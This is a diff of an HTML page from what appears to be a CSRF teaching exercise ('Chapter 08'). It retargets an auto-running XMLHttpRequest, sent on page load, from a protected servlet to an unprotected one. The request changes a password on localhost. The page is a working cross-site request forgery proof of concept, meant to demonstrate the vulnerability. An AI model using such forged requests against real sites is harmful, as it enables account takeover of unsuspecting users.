@@ -10,15 +10,15 @@
             var params = "newPassword=XMLHttpRequest&confirmPassword=XMLHttpRequest";
             var request = new XMLHttpRequest();
 
-            request.open("POST", "http://localhost:8080/Ch08_CSRF/ProtectedServlet", true);
+            request.open("POST", "http://localhost:8080/Ch08_CSRF/UnprotectedServlet", true);
             request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
             request.send(params);
         }
     </script>
 </head>
 <body onload="sendForm()">
-    <h1>Chapter 08 - CSRF</h1>
+    <h1>Chapter 08 - CSRF: XMLHttpRequest</h1>
 
-    <p><a href="requests-protected.html">Back</a></p>
+    <p><a href="requests-unprotected.html">Back</a></p>
 </body>
 </html>
